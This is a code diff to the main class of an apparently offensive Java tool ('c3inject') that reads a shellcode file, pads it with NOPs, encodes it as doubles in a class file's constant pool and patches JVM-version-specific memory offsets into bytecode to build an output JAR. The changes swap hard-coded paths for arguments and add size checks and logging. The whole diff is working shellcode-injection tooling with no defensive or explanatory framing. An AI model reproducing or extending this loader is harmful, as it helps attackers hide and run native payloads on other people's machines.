@@ -40,14 +40,26 @@ public class Main {
     }
 
     public static void main(String[] args) throws Throwable {
-        byte[] orginal = Files.readAllBytes(new File("shellcode.bin").toPath());
+        byte[] orginal = Files.readAllBytes(new File(args[0]).toPath());
         byte[] padded =  nopPadding(orginal, DOUBLE_SIZE);
         double[] doubler = toDoubleArray(
                 padded
         );
+        Map<String, Long> platformVariables = PlatformVariables.jvm1_8_0_362_64bit();
+        System.out.println("Current platform variables: " + platformVariables + " (jvm1_8_0_362_64bit) ");
+
+        if(doubler.length > 0xFFFF) {
+            System.out.println("Shellcode length: " + padded.length + " bytes");
+            System.out.println("Shellcode is too big: will have to split to " + doubler.length / 0xFFFF + " classes");
+            return;
+        }
+
+        if(padded.length > 2000) {
+            System.out.println("Shellcode is too big: will need a bootstrapper with memory allocation");
+        }
 
         new TransformationBootstrapBuilder()
-                .withInputFile(new File("C:\\Users\\azeroy\\IdeaProjects\\c3inject\\runner\\build\\libs\\runner-1.0-SNAPSHOT.jar"))
+                .withInputFile(new File(args[1]))
                 .execute(new Consumer<TransformerFile>() {
                     @Override
                     public void accept(TransformerFile file) {
@@ -75,7 +87,7 @@ public class Main {
                                             String fieldName = (String) fieldNode.visibleAnnotations.get(0).values.get(1);
                                             String type = Type.getType(fieldNode.desc).getClassName();
 
-                                            Map<String, Long> vals = new HashMap<>(PlatformVariables.jvm1_8_0_362());
+                                            Map<String, Long> vals = new HashMap<>(platformVariables);
                                             vals.put("shellcodeLength", (long) doubler.length);
 
                                             LdcInsnNode valueNode;
@@ -87,6 +99,10 @@ public class Main {
                                                 throw new RuntimeException("Unexpected type!");
                                             }
 
+                                            if(valueNode.cst == null) {
+                                                System.out.println(fieldName + " <--- invalid platform variable");
+                                            }
+
                                             methodNode.instructions.set(fieldInsnNode, valueNode);
                                         }
                                     }
@@ -96,14 +112,15 @@ public class Main {
                             clazz.getParsedNode().fields.removeIf(node -> toRemove.contains(node.name));
                         }
                     }
-                }).export(new ZipTransformerFileExporter(new File("C:\\Users\\azeroy\\IdeaProjects\\c3inject\\runner\\build\\libs\\out.jar")), classFile -> {
+                }).export(new ZipTransformerFileExporter(new File(args[2])), classFile -> {
                     ClassWriter writer = new ClassWriter(ClassWriter.COMPUTE_MAXS);
-
 
                     for (double v : doubler) {
                         writer.symbolTable.constantPool.putByte(6).putLong(Double.doubleToRawLongBits(v));
                         writer.symbolTable.constantPoolCount += 2;
                     }
+
+                    System.out.println("Writing to " + args[2]);
 
                     classFile.getNode().accept(writer);
 
